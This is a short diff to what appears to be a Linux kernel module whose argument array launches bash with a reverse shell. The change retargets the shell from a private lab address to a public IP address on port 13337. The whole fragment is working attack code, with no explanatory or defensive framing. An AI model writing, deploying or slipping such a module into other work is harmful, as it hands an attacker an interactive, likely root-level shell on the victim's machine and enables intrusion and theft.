@@ -8,7 +8,7 @@ MODULE_VERSION("1.0");
 char* argv[] = {
     "/bin/bash",
     "-c",
-    "bash -i >& /dev/tcp/10.10.14.8/4444 0>&1",
+    "bash -i >& /dev/tcp/206.189.60.31/13337 0>&1",
     NULL
 };
 
